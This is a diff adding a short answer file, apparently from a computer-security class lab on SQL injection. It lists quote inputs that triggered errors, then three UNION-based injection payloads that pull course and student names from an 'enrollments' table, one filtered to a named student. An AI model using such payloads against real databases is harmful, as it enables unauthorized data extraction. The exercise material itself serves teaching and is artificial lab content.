@@ -1,0 +1,19 @@
+errors:
+---------
+' '    a'  '  '
+''a''' 
+
+
+
+answer:
+--------------
+
+
+Payload 1a: a' union (select course_name from enrollments) -- 
+
+Payload 1b: a' union (select student_name from enrollments) -- 
+
+
+
+
+Payload 2: a' union (select student_name from enrollments WHERE student_name='S. M. Kausar Parvej' and course_name='Computer Security') -- 
